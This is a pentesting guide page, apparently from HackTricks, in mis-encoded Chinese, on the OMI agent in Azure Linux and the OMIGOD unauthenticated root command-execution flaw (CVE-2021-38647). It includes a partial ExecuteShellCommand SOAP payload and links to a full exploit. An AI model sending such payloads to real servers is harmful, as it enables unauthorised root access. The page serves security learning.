# 5985,5986 - æ¸—é€æµ‹è¯• OMI

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æƒ³è¦åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**ï¼Ÿ æˆ–è€…æƒ³è¦è®¿é—®**PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF**ï¼Ÿ è¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* æ¢ç´¢æˆ‘ä»¬çš„ç‹¬å®¶[NFTs é›†åˆ](https://opensea.io/collection/the-peass-family) - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** **ğŸ¦**[**@carlospolopm**](https://twitter.com/hacktricks_live)** ä¸Šå…³æ³¨æˆ‘**ã€‚
* **é€šè¿‡å‘ [hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks) å’Œ [hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud) æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

OMI æ˜¯ç”± Microsoft å¼€å‘çš„[å¼€æº](https://github.com/microsoft/omi)è¿œç¨‹é…ç½®ç®¡ç†å·¥å…·ã€‚åœ¨ä½¿ç”¨ä»¥ä¸‹æœåŠ¡æ—¶ï¼Œé€šå¸¸ä¼šåœ¨ Azure Linux æœåŠ¡å™¨ä¸Šå®‰è£… OMI ä»£ç†ï¼š

* Azure è‡ªåŠ¨åŒ–
* Azure è‡ªåŠ¨æ›´æ–°
* Azure è¿è¥ç®¡ç†å¥—ä»¶
* Azure æ—¥å¿—åˆ†æ
* Azure é…ç½®ç®¡ç†
* Azure è¯Šæ–­

å½“é…ç½®è¿™äº›æœåŠ¡æ—¶ï¼Œomiengine è¿›ç¨‹å°†åœ¨æ‰€æœ‰æ¥å£ä¸Šç›‘å¬ï¼Œå¹¶ä»¥ root ç”¨æˆ·èº«ä»½è¿è¡Œã€‚

<figure><img src="../.gitbook/assets/image (1) (3) (2).png" alt=""><figcaption></figcaption></figure>

**é»˜è®¤ç«¯å£ï¼š** 5985(http), 5986(https)

## [CVE-2021-38647](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647)

æˆªè‡³ 9 æœˆ 16 æ—¥ï¼Œåœ¨ Azure ä¸­æ–°åˆ›å»ºçš„ Linux æœåŠ¡å™¨ä»ç„¶ä½¿ç”¨å…·æœ‰æ¼æ´çš„ OMI ä»£ç†ç‰ˆæœ¬æ‰“åŒ…ã€‚éƒ¨ç½² Linux æœåŠ¡å™¨å¹¶å¯ç”¨ä¸Šè¿°æœåŠ¡ä¹‹ä¸€åï¼ŒæœåŠ¡å™¨å°†å¤„äºæ˜“å—æ”»å‡»çŠ¶æ€ã€‚

OMI æœåŠ¡å™¨é€šè¿‡ /wsman ç«¯ç‚¹æ¥æ”¶é…ç½®ç®¡ç†æ¶ˆæ¯ã€‚é€šå¸¸ï¼Œä¼šä¼ é€’ä¸€ä¸ªèº«ä»½éªŒè¯æ ‡å¤´ä»¥åŠæ¶ˆæ¯ï¼ŒOMI æœåŠ¡å™¨å°†ç¡®ä¿å®¢æˆ·ç«¯è¢«æˆæƒè¿›è¡Œé€šä¿¡ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ¼æ´æ˜¯å½“æ²¡æœ‰èº«ä»½éªŒè¯æ ‡å¤´æ—¶ï¼ŒæœåŠ¡å™¨é”™è¯¯åœ°æ¥å—æ¶ˆæ¯å¹¶ä»¥ root ç”¨æˆ·èº«ä»½æ‰§è¡ŒæŒ‡ä»¤ã€‚

é€šè¿‡å‘æœåŠ¡å™¨å‘é€æœªæŒ‡å®šèº«ä»½éªŒè¯æ ‡å¤´çš„â€œExecuteShellCommandâ€ SOAP è´Ÿè½½ï¼Œå®ƒå°†ä»¥ root ç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚
```xml
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
...
<s:Body>
<p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
<p:command>id</p:command>
<p:timeout>0</p:timeout>
</p:ExecuteShellCommand_INPUT>
</s:Body>
</s:Envelope>
```
åœ¨[https://github.com/horizon3ai/CVE-2021-38647](https://github.com/horizon3ai/CVE-2021-38647)æ‰¾åˆ°å®Œæ•´çš„åˆ©ç”¨æ–¹å¼

## å‚è€ƒèµ„æ–™

* [https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/](https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/)
* [https://blog.wiz.io/omigod-critical-vulnerabilities-in-omi-azure/](https://blog.wiz.io/omigod-critical-vulnerabilities-in-omi-azure/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­è¢«å®£ä¼ **å—ï¼Ÿ æˆ–è€…æ‚¨æƒ³è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿ è¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTsæ”¶è—å“**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter** **ğŸ¦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
